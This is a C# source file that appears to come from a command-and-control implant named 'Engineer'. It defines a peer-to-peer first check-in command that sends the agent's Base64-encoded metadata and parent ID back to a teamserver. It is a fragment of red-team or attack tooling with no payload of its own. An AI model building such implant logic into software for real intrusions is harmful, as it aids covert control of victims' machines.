using Engineer.Commands;
using Engineer.Functions;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class FirstCheckIn : EngineerCommand
    {
        public static bool firstCheckInDone = false; 
        public override string Name => "P2PFirstTimeCheckIn";

        public override async Task Execute(EngineerTask task)
        {
            task.Arguments.TryGetValue("/parentid", out string parentId);
            Tasking.FillTaskResults(Convert.ToBase64String(Program._metadata.JsonSerialize()) +"\n" + parentId,task,EngTaskStatus.Complete,TaskResponseType.String); //gives back the engineers metadata and the parent so the teamserver can make the path
        }
    }
}
